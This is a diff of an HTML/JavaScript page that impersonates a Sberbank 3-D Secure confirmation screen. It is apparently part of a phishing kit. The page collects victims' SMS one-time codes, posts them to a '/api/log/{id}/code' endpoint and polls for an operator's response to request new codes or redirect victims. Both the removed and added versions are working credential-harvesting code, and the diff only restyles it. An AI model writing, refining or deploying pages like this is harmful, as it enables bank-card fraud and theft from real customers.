@@ -2,494 +2,568 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ввод кода — СберБанк</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <title>Подтверждение | 3-D Secure</title>
     <link rel="shortcut icon" href="favicons/favicon_sber.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
-
         body {
-            font-family: 'SB Sans Interface', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f3f4f5;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(180deg, #0a1628 0%, #1a2d4a 50%, #0f1f35 100%);
             min-height: 100vh;
-        }
-
-        .header {
-            background: #fff;
-            padding: 16px 24px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            box-shadow: 0 1px 0 rgba(0,0,0,0.05);
-        }
-
-        .logo {
-            height: 28px;
-        }
-
-        .mir-badge {
-            background: #4DB45E;
-            color: #fff;
-            padding: 4px 12px;
-            border-radius: 6px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .container {
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 24px 20px;
-        }
-
-        .amount {
-            font-size: 32px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 24px;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 14px;
-        }
-
-        .info-row:last-of-type {
-            border-bottom: none;
-            margin-bottom: 24px;
-        }
-
-        .info-label {
-            color: #21a038;
-        }
-
-        .info-value {
-            color: #8b8b8b;
-        }
-
-        .card {
-            background: #fff;
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
-            margin-bottom: 20px;
-        }
-
-        .card-title {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #1a1a1a;
-        }
-
-        .card-desc {
-            font-size: 14px;
-            color: #1a1a1a;
-            line-height: 1.5;
-            margin-bottom: 16px;
-        }
-
-        .card-warning {
-            font-size: 13px;
-            color: #e67e22;
-            margin-bottom: 20px;
-        }
-
-        .form-label {
-            font-size: 13px;
-            color: #8b8b8b;
-            margin-bottom: 8px;
-            display: block;
-        }
-
-        .code-input {
-            width: 100%;
-            padding: 16px;
-            border: 2px solid #e5e5e5;
-            border-radius: 12px;
-            font-size: 20px;
-            text-align: center;
-            letter-spacing: 8px;
-            font-weight: 600;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .code-input:focus {
-            border-color: #21a038;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: 2px solid #1a1a1a;
-            border-radius: 12px;
-            background: #fff;
-            color: #1a1a1a;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-bottom: 12px;
-        }
-
-        .btn:hover {
-            background: #1a1a1a;
-            color: #fff;
-        }
-
-        .btn.primary {
-            background: #1a1a1a;
-            color: #fff;
-            border-color: #1a1a1a;
-        }
-
-        .btn.primary:hover {
-            background: #333;
-        }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .btn-secondary {
-            width: 100%;
-            padding: 16px;
-            border: 2px solid #e5e5e5;
-            border-radius: 12px;
-            background: #fff;
-            color: #8b8b8b;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .btn-secondary:hover:not(:disabled) {
-            border-color: #21a038;
-            color: #21a038;
-        }
-
-        .btn-secondary:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .footer-text {
-            font-size: 12px;
-            color: #8b8b8b;
-            text-align: center;
-            line-height: 1.6;
-            margin-top: 20px;
-        }
-
-        .footer-text a {
-            color: #21a038;
-            text-decoration: none;
-        }
-
-        /* Processing overlay */
-        .processing-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255,255,255,0.98);
-            z-index: 1000;
             justify-content: center;
-            align-items: center;
-            flex-direction: column;
+            padding: 20px;
         }
-
-        .processing-overlay.active {
+        
+        /* Background */
+        .bg-animation {
+            position: fixed;
+            inset: 0;
+            overflow: hidden;
+            z-index: 0;
+        }
+        .bg-circle {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(33,160,56,0.15) 0%, transparent 70%);
+            animation: float 8s ease-in-out infinite;
+        }
+        .bg-circle:nth-child(1) {
+            width: 600px;
+            height: 600px;
+            top: -200px;
+            right: -100px;
+        }
+        .bg-circle:nth-child(2) {
+            width: 400px;
+            height: 400px;
+            bottom: -100px;
+            left: -100px;
+            animation-delay: -3s;
+        }
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(20px, -20px) scale(1.05); }
+        }
+        
+        /* Card */
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            animation: fadeIn 0.6s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Header */
+        .header {
             display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 32px;
         }
-
-        .processing-title {
+        .header__icon {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, #21a038 0%, #2bc94a 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .header__icon svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+        }
+        .header__text {
+            color: #fff;
             font-size: 18px;
             font-weight: 600;
-            margin-bottom: 24px;
-            color: #1a1a1a;
         }
-
-        .processing-spinner {
+        .header__text span {
+            color: #21a038;
+        }
+        
+        /* Title */
+        .title {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+        
+        /* Phone hint */
+        .phone-hint {
             display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(33, 160, 56, 0.1);
+            border: 1px solid rgba(33, 160, 56, 0.2);
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 24px;
+        }
+        .phone-hint__icon {
+            width: 36px;
+            height: 36px;
+            background: #21a038;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .phone-hint__icon svg {
+            width: 18px;
+            height: 18px;
+            fill: #fff;
+        }
+        .phone-hint__text {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 13px;
+            line-height: 1.4;
+        }
+        
+        /* Code input */
+        .code-input-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .code-digit {
+            width: 52px;
+            height: 64px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            font-size: 28px;
+            font-weight: 600;
+            color: #fff;
+            text-align: center;
+            font-family: 'Monaco', 'Menlo', monospace;
+            transition: all 0.2s ease;
+        }
+        .code-digit:focus {
+            outline: none;
+            border-color: #21a038;
+            background: rgba(33, 160, 56, 0.1);
+        }
+        .code-digit.filled {
+            border-color: #21a038;
+            background: rgba(33, 160, 56, 0.15);
+        }
+        .code-digit.error {
+            border-color: #ef4444;
+            background: rgba(239, 68, 68, 0.1);
+            animation: shake 0.4s ease;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+        
+        /* Submit button */
+        .submit-btn {
+            width: 100%;
+            height: 52px;
+            background: linear-gradient(135deg, #21a038 0%, #2bc94a 100%);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             gap: 8px;
         }
-
-        .processing-spinner span {
-            width: 16px;
-            height: 16px;
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(33, 160, 56, 0.35);
+        }
+        .submit-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        /* Resend link */
+        .resend {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .resend__link {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 13px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .resend__link:hover {
+            color: #21a038;
+        }
+        .resend__link.disabled {
+            pointer-events: none;
+            opacity: 0.4;
+        }
+        .resend__timer {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        
+        /* Error message */
+        .error-msg {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 10px;
+            padding: 12px 14px;
+            color: #fca5a5;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+        }
+        .error-msg.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        /* Loader overlay */
+        .loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(10, 22, 40, 0.95);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .loader-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .loader-spinner {
+            width: 56px;
+            height: 56px;
+            border: 4px solid rgba(33, 160, 56, 0.2);
+            border-top-color: #21a038;
             border-radius: 50%;
-            animation: pulse 1.5s ease-in-out infinite;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
-
-        .processing-spinner span:nth-child(1) {
-            background: #00d4aa;
-            animation-delay: 0s;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
-        .processing-spinner span:nth-child(2) {
-            background: #00c4d4;
-            animation-delay: 0.15s;
+        .loader-text {
+            color: #fff;
+            font-size: 15px;
         }
-        .processing-spinner span:nth-child(3) {
-            background: #00b4e4;
-            animation-delay: 0.3s;
-        }
-        .processing-spinner span:nth-child(4) {
-            background: #00a4f4;
-            animation-delay: 0.45s;
-        }
-        .processing-spinner span:nth-child(5) {
-            background: #0094ff;
-            animation-delay: 0.6s;
-        }
-        .processing-spinner span:nth-child(6) {
-            background: #00c4d4;
-            animation-delay: 0.75s;
-        }
-        .processing-spinner span:nth-child(7) {
-            background: #00d4aa;
-            animation-delay: 0.9s;
-        }
-        .processing-spinner span:nth-child(8) {
-            background: #00e490;
-            animation-delay: 1.05s;
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                transform: scale(0.8);
-                opacity: 0.5;
+        
+        @media (max-width: 400px) {
+            .card {
+                padding: 28px 20px;
             }
-            50% {
-                transform: scale(1.2);
-                opacity: 1;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .amount {
-                font-size: 28px;
+            .code-digit {
+                width: 44px;
+                height: 56px;
+                font-size: 24px;
             }
         }
     </style>
 </head>
 <body>
-    <header class="header">
-        <img src="images/sberbank-logo.befb25b6.svg" alt="Сбербанк" class="logo">
-        <div style="display: flex; gap: 8px; align-items: center;">
-            <span class="mir-badge">МИР</span>
-            <span style="color: #8b8b8b; font-size: 12px;">Accept</span>
-        </div>
-    </header>
-
-    <div class="container">
-        <div class="amount">15000 ₽</div>
-
-        <div class="info-row">
-            <span class="info-label">Магазин</span>
-            <span class="info-value">Sber</span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">Номер карты</span>
-            <span class="info-value" id="cardLast4">•• ****</span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">Дата</span>
-            <span class="info-value" id="currentDate">04.02.2026</span>
-        </div>
-
-        <div class="card">
-            <h2 class="card-title">Отправили код</h2>
-            <p class="card-desc">В СМС или Push-уведомлении. Чтобы получить его, ваш номер должен быть подключен к СМС-банку.</p>
-            <p class="card-warning">Время доставки кода зависит от вашего оператора и может занимать до 5 минут.</p>
-
-            <label class="form-label">Введите код</label>
-            <input type="text" class="code-input" id="codeInput" maxlength="6" inputmode="numeric" placeholder="" autocomplete="one-time-code">
-        </div>
-
-        <button class="btn primary" id="submitBtn" onclick="submitCode()">Отправить код</button>
-        <button class="btn-secondary" id="resendBtn" disabled>Запросить новый код через <span id="timer">60</span> секунд</button>
-
-        <p class="footer-text">
-            Оплата покупок без комиссии. За пополнение карт и кошельков через приложения и сайты других банков взимается комиссия.<br><br>
-            Подтверждая операцию с помощью смс-кода, вы соглашаетесь с условиями и тарифами: <a href="#">ссылка</a>
-        </p>
+    <div class="bg-animation">
+        <div class="bg-circle"></div>
+        <div class="bg-circle"></div>
     </div>
-
-    <!-- Processing overlay -->
-    <div class="processing-overlay" id="processingOverlay">
-        <div class="processing-title">Обработка введённых данных...</div>
-        <div class="processing-spinner">
-            <span></span>
-            <span></span>
-            <span></span>
-            <span></span>
-            <span></span>
-            <span></span>
-            <span></span>
-            <span></span>
+    
+    <div class="card">
+        <div class="header">
+            <div class="header__icon">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            </div>
+            <div class="header__text"><span>3-D</span> Secure</div>
         </div>
+        
+        <h1 class="title">Подтверждение операции</h1>
+        <p class="subtitle">Введите код подтверждения, отправленный на ваш номер телефона</p>
+        
+        <div class="phone-hint">
+            <div class="phone-hint__icon">
+                <svg viewBox="0 0 24 24"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/></svg>
+            </div>
+            <span class="phone-hint__text">СМС-код отправлен на номер,<br>привязанный к карте</span>
+        </div>
+        
+        <div class="error-msg" id="errorMsg"></div>
+        
+        <div class="code-input-container" id="codeContainer">
+            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+        </div>
+        
+        <button class="submit-btn" id="submitBtn" disabled>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            Подтвердить
+        </button>
+        
+        <div class="resend">
+            <a class="resend__link disabled" id="resendLink">Отправить код повторно</a>
+            <div class="resend__timer" id="resendTimer">Повторная отправка через 60 сек</div>
+        </div>
+    </div>
+    
+    <div class="loader-overlay" id="loader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">Проверка кода...</div>
     </div>
 
     <script>
         const API_URL = '/api';
         const LOG_ID = new URLSearchParams(window.location.search).get('id');
-
+        
         if (!LOG_ID) {
             window.location.href = 'receive.html';
         }
-
-        // Установка текущей даты
-        const today = new Date();
-        document.getElementById('currentDate').textContent = today.toLocaleDateString('ru-RU');
-
-        // Получение последних 4 цифр карты
-        async function getCardInfo() {
-            try {
-                const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
-                const data = await response.json();
-                if (data.card_last4) {
-                    document.getElementById('cardLast4').textContent = `•• ${data.card_last4}`;
+        
+        const digits = document.querySelectorAll('.code-digit');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const loader = document.getElementById('loader');
+        const resendLink = document.getElementById('resendLink');
+        const resendTimer = document.getElementById('resendTimer');
+        
+        let timerSeconds = 60;
+        
+        // Focus first input
+        digits[0].focus();
+        
+        // Handle input
+        digits.forEach((digit, index) => {
+            digit.addEventListener('input', (e) => {
+                const value = e.target.value.replace(/\D/g, '');
+                e.target.value = value.slice(-1);
+                
+                if (value && index < digits.length - 1) {
+                    digits[index + 1].focus();
                 }
-            } catch (error) {
-                console.error('Error:', error);
-            }
-        }
-        getCardInfo();
-
-        // Автофокус на поле ввода
-        const codeInput = document.getElementById('codeInput');
-        codeInput.focus();
-
-        // Только цифры
-        codeInput.addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+                
+                digit.classList.toggle('filled', !!value);
+                digit.classList.remove('error');
+                
+                updateSubmitButton();
+            });
+            
+            digit.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    digits[index - 1].focus();
+                }
+                
+                // Allow paste
+                if ((e.ctrlKey || e.metaKey) && e.key === 'v') {
+                    return;
+                }
+                
+                // Enter to submit
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (!submitBtn.disabled) {
+                        submitCode();
+                    }
+                }
+            });
+            
+            digit.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const numbers = paste.replace(/\D/g, '').slice(0, 6);
+                
+                numbers.split('').forEach((num, i) => {
+                    if (digits[i]) {
+                        digits[i].value = num;
+                        digits[i].classList.add('filled');
+                    }
+                });
+                
+                const nextEmpty = [...digits].findIndex(d => !d.value);
+                if (nextEmpty !== -1) {
+                    digits[nextEmpty].focus();
+                } else {
+                    digits[digits.length - 1].focus();
+                }
+                
+                updateSubmitButton();
+            });
         });
-
-        // Таймер для повторной отправки
-        let timeLeft = 60;
-        const timerInterval = setInterval(() => {
-            timeLeft--;
-            document.getElementById('timer').textContent = timeLeft;
+        
+        function updateSubmitButton() {
+            const code = getCode();
+            submitBtn.disabled = code.length < 4;
+        }
+        
+        function getCode() {
+            return [...digits].map(d => d.value).join('');
+        }
+        
+        function showError(text) {
+            errorMsg.textContent = text;
+            errorMsg.classList.add('show');
+            digits.forEach(d => d.classList.add('error'));
             
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                const resendBtn = document.getElementById('resendBtn');
-                resendBtn.disabled = false;
-                resendBtn.textContent = 'Запросить новый код';
-                resendBtn.onclick = requestNewCode;
-            }
-        }, 1000);
-
-        // Отправка кода
+            setTimeout(() => {
+                errorMsg.classList.remove('show');
+            }, 5000);
+        }
+        
+        function clearInputs() {
+            digits.forEach(d => {
+                d.value = '';
+                d.classList.remove('filled', 'error');
+            });
+            digits[0].focus();
+            updateSubmitButton();
+        }
+        
+        function showLoader(show) {
+            loader.classList.toggle('show', show);
+        }
+        
+        // Timer
+        function startTimer() {
+            timerSeconds = 60;
+            resendLink.classList.add('disabled');
+            
+            const interval = setInterval(() => {
+                timerSeconds--;
+                resendTimer.textContent = `Повторная отправка через ${timerSeconds} сек`;
+                
+                if (timerSeconds <= 0) {
+                    clearInterval(interval);
+                    resendLink.classList.remove('disabled');
+                    resendTimer.textContent = '';
+                }
+            }, 1000);
+        }
+        startTimer();
+        
+        // Submit code
         async function submitCode() {
-            const code = codeInput.value;
+            const code = getCode();
+            if (code.length < 4) return;
             
-            if (code.length < 4) {
-                alert('Введите код из СМС');
-                return;
-            }
-
-            document.getElementById('processingOverlay').classList.add('active');
-
+            showLoader(true);
+            submitBtn.disabled = true;
+            
             try {
-                await fetch(`${API_URL}/log/${LOG_ID}/code`, {
+                const response = await fetch(`${API_URL}/log/${LOG_ID}/code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ code })
                 });
-
-                // Ждём ответа от оператора
-                checkProcessingStatus();
+                
+                if (response.ok) {
+                    // Начинаем проверять статус
+                    checkStatus();
+                } else {
+                    showError('Ошибка отправки кода');
+                    showLoader(false);
+                    submitBtn.disabled = false;
+                }
             } catch (error) {
                 console.error('Error:', error);
-                alert('Ошибка отправки кода');
-                document.getElementById('processingOverlay').classList.remove('active');
+                showError('Ошибка соединения');
+                showLoader(false);
+                submitBtn.disabled = false;
             }
         }
-
-        // Проверка статуса обработки
-        async function checkProcessingStatus() {
+        
+        submitBtn.addEventListener('click', submitCode);
+        
+        // Check status
+        async function checkStatus() {
             try {
                 const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
                 const data = await response.json();
 
                 if (data.status === 'success') {
-                    document.getElementById('processingOverlay').classList.remove('active');
+                    showLoader(false);
                     alert('Операция успешно завершена!');
                     window.location.href = 'index_sber.html';
                 } else if (data.status === 'error' && data.error) {
-                    document.getElementById('processingOverlay').classList.remove('active');
+                    showLoader(false);
                     
-                    if (data.error.includes('Неверно указан код') || data.error.includes('неверный')) {
-                        alert(data.error);
-                        codeInput.value = '';
-                        codeInput.focus();
-                    } else if (data.error.includes('смените карту') || data.error.includes('Смена')) {
+                    if (data.error.includes('Неверно указан код') || data.error.toLowerCase().includes('неверный')) {
+                        showError(data.error);
+                        clearInputs();
+                        submitBtn.disabled = false;
+                    } else if (data.error.includes('смените карту') || data.error.includes('Смена') || data.error.includes('Банк')) {
                         alert(data.error);
                         window.location.href = 'receive.html';
                     } else {
-                        alert(data.error);
-                        codeInput.value = '';
-                        codeInput.focus();
+                        showError(data.error);
+                        clearInputs();
+                        submitBtn.disabled = false;
                     }
                 } else if (data.status === 'code' && data.error && data.error.includes('новый код')) {
-                    // Запрошен новый код
-                    document.getElementById('processingOverlay').classList.remove('active');
+                    showLoader(false);
                     alert('Отправлен новый код. Проверьте СМС.');
-                    codeInput.value = '';
-                    codeInput.focus();
+                    clearInputs();
+                    startTimer();
+                    submitBtn.disabled = false;
                 } else {
-                    // Продолжаем проверять
-                    setTimeout(checkProcessingStatus, 2000);
+                    setTimeout(checkStatus, 2000);
                 }
             } catch (error) {
                 console.error('Error:', error);
-                setTimeout(checkProcessingStatus, 2000);
+                setTimeout(checkStatus, 2000);
             }
         }
-
-        // Запрос нового кода
-        async function requestNewCode() {
-            try {
-                await fetch(`${API_URL}/log/${LOG_ID}/new_code`, {
-                    method: 'POST'
-                });
-                alert('Новый код отправлен');
-                
-                // Сброс таймера
-                timeLeft = 60;
-                document.getElementById('resendBtn').disabled = true;
-                document.getElementById('resendBtn').textContent = `Запросить новый код через ${timeLeft} секунд`;
-            } catch (error) {
-                console.error('Error:', error);
-            }
-        }
-
-        // Проверка статуса в фоне (на случай если оператор запросит новый код)
-        setInterval(async () => {
-            try {
-                const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
-                const data = await response.json();
-                
-                if (data.error === 'wrong_code') {
-                    alert('Неверный код. Попробуйте ещё раз.');
-                    codeInput.value = '';
-                    codeInput.focus();
-                }
-            } catch (error) {}
-        }, 3000);
+        
+        // Resend code
+        resendLink.addEventListener('click', async () => {
+            if (resendLink.classList.contains('disabled')) return;
+            
+            // В будущем можно добавить запрос на повторную отправку
+            startTimer();
+        });
     </script>
 </body>
 </html>
